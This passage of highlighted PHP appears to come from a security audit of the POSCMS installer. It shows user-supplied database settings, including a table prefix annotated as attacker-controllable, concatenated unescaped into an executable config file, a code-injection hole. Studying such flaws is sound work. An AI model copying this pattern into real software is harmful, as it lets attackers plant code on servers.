</span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>load</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>helper</span>(<span style=color:#e6db74>&#39;email&#39;</span>);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$data[<span style=color:#e6db74>&#39;email&#39;</span>] <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>valid_email</span>($data[<span style=color:#e6db74>&#39;email&#39;</span>])) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;Email格式不正确&#39;</span>));
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> ($mysqli) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!@</span><span style=color:#a6e22e>mysqli_real_connect</span>($mysqli, $data[<span style=color:#e6db74>&#39;dbhost&#39;</span>], $data[<span style=color:#e6db74>&#39;dbuser&#39;</span>], $data[<span style=color:#e6db74>&#39;dbpw&#39;</span>])) {
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;[mysqli_real_connect] 无法连接到数据库服务器（&#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbhost&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;），请检查用户名（&#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbuser&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;）和密码（&#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbpw&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;）是否正确&#39;</span>));
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!@</span><span style=color:#a6e22e>mysqli_select_db</span>($mysqli, $data[<span style=color:#e6db74>&#39;dbname&#39;</span>])) {
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!@</span><span style=color:#a6e22e>mysqli_query</span>($mysqli, <span style=color:#e6db74>&#39;CREATE DATABASE &#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbname&#39;</span>])) {
</span></span><span style=display:flex><span>                                <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;指定的数据库（&#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbname&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;）不存在，系统尝试创建失败，请通过其他方式建立数据库&#39;</span>));
</span></span><span style=display:flex><span>                            }
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                        <span style=color:#75715e>// utf8方式打开数据库
</span></span></span><span style=display:flex><span>                        <span style=color:#a6e22e>mysqli_query</span>($mysqli, <span style=color:#e6db74>&#39;SET NAMES utf8&#39;</span>);
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!@</span><span style=color:#a6e22e>mysql_connect</span>($data[<span style=color:#e6db74>&#39;dbhost&#39;</span>], $data[<span style=color:#e6db74>&#39;dbuser&#39;</span>], $data[<span style=color:#e6db74>&#39;dbpw&#39;</span>])) {
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>mysql_error</span>()<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;br&gt;无法连接到数据库服务器（&#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbhost&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;），请检查用户名（&#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbuser&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;）和密码（&#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbpw&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;）是否正确&#39;</span>));
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!@</span><span style=color:#a6e22e>mysql_select_db</span>($data[<span style=color:#e6db74>&#39;dbname&#39;</span>])) {
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!@</span><span style=color:#a6e22e>mysql_query</span>(<span style=color:#e6db74>&#39;CREATE DATABASE &#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbname&#39;</span>])) {
</span></span><span style=display:flex><span>                                <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>mysql_error</span>()<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;br&gt;指定的数据库（&#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;dbname&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;）不存在，系统尝试创建失败，请通过其他方式建立数据库&#39;</span>));
</span></span><span style=display:flex><span>                            }
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                        <span style=color:#75715e>// utf8方式打开数据库
</span></span></span><span style=display:flex><span>                        <span style=color:#a6e22e>mysql_query</span>(<span style=color:#e6db74>&#39;SET NAMES utf8&#39;</span>);
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 格式化端口
</span></span></span><span style=display:flex><span>                    <span style=color:#66d9ef>list</span>($data[<span style=color:#e6db74>&#39;dbhost&#39;</span>], $data[<span style=color:#e6db74>&#39;dbport&#39;</span>]) <span style=color:#f92672>=</span> <span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#39;:&#39;</span>, $data[<span style=color:#e6db74>&#39;dbhost&#39;</span>]);
</span></span><span style=display:flex><span>                    $data[<span style=color:#e6db74>&#39;dbport&#39;</span>] <span style=color:#f92672>=</span> $data[<span style=color:#e6db74>&#39;dbport&#39;</span>] <span style=color:#f92672>?</span> (<span style=color:#a6e22e>int</span>)$data[<span style=color:#e6db74>&#39;dbport&#39;</span>] <span style=color:#f92672>:</span> <span style=color:#ae81ff>3306</span>;
</span></span><span style=display:flex><span>                    $data[<span style=color:#e6db74>&#39;dbprefix&#39;</span>] <span style=color:#f92672>=</span> $data[<span style=color:#e6db74>&#39;dbprefix&#39;</span>] <span style=color:#f92672>?</span> $data[<span style=color:#e6db74>&#39;dbprefix&#39;</span>] <span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;dr_&#39;</span>; <span style=color:#75715e>// 这个变量可控
</span></span></span><span style=display:flex><span>                    <span style=color:#75715e>// 配置文件
</span></span></span><span style=display:flex><span>                    $config <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;?php&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;if (!defined(&#39;BASEPATH&#39;)) exit(&#39;No direct script access allowed&#39;);&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\$</span><span style=color:#e6db74>active_group = &#39;default&#39;;&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\$</span><span style=color:#e6db74>query_builder  = TRUE;&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\$</span><span style=color:#e6db74>db[&#39;default&#39;]  = array(&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;dsn&#39;   =&gt; &#39;&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;hostname&#39;  =&gt; &#39;</span><span style=color:#e6db74>{</span>$data[<span style=color:#e6db74>&#39;dbhost&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;username&#39;  =&gt; &#39;</span><span style=color:#e6db74>{</span>$data[<span style=color:#e6db74>&#39;dbuser&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;password&#39;  =&gt; &#39;</span><span style=color:#e6db74>{</span>$data[<span style=color:#e6db74>&#39;dbpw&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;port&#39;    =&gt; &#39;</span><span style=color:#e6db74>{</span>$data[<span style=color:#e6db74>&#39;dbport&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;database&#39;  =&gt; &#39;</span><span style=color:#e6db74>{</span>$data[<span style=color:#e6db74>&#39;dbname&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;dbdriver&#39;  =&gt; &#39;&#34;</span><span style=color:#f92672>.</span>($mysqli <span style=color:#f92672>?</span> <span style=color:#e6db74>&#39;mysqli&#39;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;mysql&#39;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;dbprefix&#39;  =&gt; &#39;</span><span style=color:#e6db74>{</span>$data[<span style=color:#e6db74>&#39;dbprefix&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;pconnect&#39;  =&gt; FALSE,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;db_debug&#39;  =&gt; true,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;cache_on&#39;  =&gt; FALSE,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;cachedir&#39;  =&gt; &#39;cache/sql/&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;char_set&#39;  =&gt; &#39;utf8&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;dbcollat&#39;  =&gt; &#39;utf8_general_ci&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;swap_pre&#39;  =&gt; &#39;&#39;,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;autoinit&#39;  =&gt; FALSE,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;encrypt&#39; =&gt; FALSE,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;compress&#39;  =&gt; FALSE,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;stricton&#39;  =&gt; FALSE,&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34; &#39;failover&#39;  =&gt; array(),&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    $config<span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;);&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 保存配置文件
</span></span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>file_put_contents</span>(<span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;config/database.php&#39;</span>, $config)) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;数据库配置文件保存失败，请检查文件config/database.php权限！&#39;</span>));
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 加载数据库
</span></span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>load</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>database</span>();
</span></span><span style=display:flex><span>                    $salt <span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>(<span style=color:#a6e22e>md5</span>(<span style=color:#a6e22e>rand</span>(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>999</span>)), <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>10</span>);
</span></span><span style=display:flex><span>                    $password <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>(<span style=color:#a6e22e>md5</span>($data[<span style=color:#e6db74>&#39;password&#39;</span>])<span style=color:#f92672>.</span>$salt<span style=color:#f92672>.</span><span style=color:#a6e22e>md5</span>($data[<span style=color:#e6db74>&#39;password&#39;</span>]));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 导入表结构
</span></span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_query</span>(<span style=color:#a6e22e>str_replace</span>(
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;{dbprefix}&#39;</span>, <span style=color:#e6db74>&#39;{username}&#39;</span>, <span style=color:#e6db74>&#39;{password}&#39;</span>, <span style=color:#e6db74>&#39;{salt}&#39;</span>, <span style=color:#e6db74>&#39;{email}&#39;</span>),
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>array</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dbprefix</span>, $data[<span style=color:#e6db74>&#39;admin&#39;</span>], $password, $salt, $data[<span style=color:#e6db74>&#39;email&#39;</span>]),
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;cache/install/install.sql&#39;</span>)
</span></span><span style=display:flex><span>                    ));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 导入会员菜单数据
</span></span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_query</span>(<span style=color:#a6e22e>str_replace</span>(
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;{dbprefix}&#39;</span>,
</span></span><span style=display:flex><span>                        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dbprefix</span>,
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;cache/install/member_menu.sql&#39;</span>)
</span></span><span style=display:flex><span>                    ));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 系统配置文件
</span></span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>load</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>model</span>(<span style=color:#e6db74>&#39;system_model&#39;</span>);
</span></span><span style=display:flex><span>                    $config <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_LOG&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;FALSE&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_KEY&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;poscms&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>md5</span>(<span style=color:#a6e22e>time</span>()),
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_DEBUG&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;FALSE&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_HELP_URL&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_EMAIL&#39;</span> <span style=color:#f92672>=&gt;</span> $data[<span style=color:#e6db74>&#39;email&#39;</span>],
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_MEMCACHE&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;FALSE&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_UPLOAD_DIR&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#a6e22e>SYS_UPLOAD_DIR</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CRON_QUEUE&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CRON_NUMS&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>20</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CRON_TIME&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_ONLINE_NUM&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>1000</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_ONLINE_TIME&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>7200</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_NAME&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;POSCMS&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_NEWS&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;TRUE&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CMS&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;POSCMS&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_UPDATE&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SITE_EXPERIENCE&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;经验值&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SITE_SCORE&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;虚拟币&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SITE_MONEY&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;金钱&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SITE_CONVERT&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>10</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SITE_ADMIN_CODE&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;FALSE&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SITE_ADMIN_PAGESIZE&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>8</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_INDEX&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_MINDEX&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_MSHOW&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_MSEARCH&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_SITEMAP&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_LIST&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_MEMBER&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_ATTACH&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_FORM&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_POSTER&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_SPACE&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;SYS_CACHE_TAG&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>300</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    );
</span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>system_model</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>save_config</span>($config, $config);
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 站点配置文件
</span></span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>load</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>model</span>(<span style=color:#e6db74>&#39;site_model&#39;</span>);
</span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>load</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>library</span>(<span style=color:#e6db74>&#39;dconfig&#39;</span>);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_file</span>(<span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;config/site/1.php&#39;</span>)) {
</span></span><span style=display:flex><span>                        $config <span style=color:#f92672>=</span> <span style=color:#66d9ef>require</span> <span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;config/site/1.php&#39;</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    $config[<span style=color:#e6db74>&#39;SITE_THEME&#39;</span>] <span style=color:#f92672>=</span> $config[<span style=color:#e6db74>&#39;SITE_TEMPLATE&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;default&#39;</span>;
</span></span><span style=display:flex><span>                    $config[<span style=color:#e6db74>&#39;SITE_DOMAIN&#39;</span>] <span style=color:#f92672>=</span> $config[<span style=color:#e6db74>&#39;SITE_ATTACH_HOST&#39;</span>] <span style=color:#f92672>=</span> $config[<span style=color:#e6db74>&#39;SITE_ATTACH_URL&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtolower</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_HOST&#39;</span>]);
</span></span><span style=display:flex><span>                    $site <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;name&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;POSCMS&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;domain&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#a6e22e>strtolower</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_HOST&#39;</span>]),
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;setting&#39;</span> <span style=color:#f92672>=&gt;</span> $config,
</span></span><span style=display:flex><span>                    );
</span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>site_model</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>add_site</span>($site);
</span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dconfig</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>(<span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;config/site/1.php&#39;</span>)<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>note</span>(<span style=color:#e6db74>&#39;站点配置文件&#39;</span>)<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>space</span>(<span style=color:#ae81ff>32</span>)<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>to_require_one</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>site_model</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>config</span>, $config);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 初始化菜单
</span></span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>load</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>model</span>(<span style=color:#e6db74>&#39;menu_model&#39;</span>);
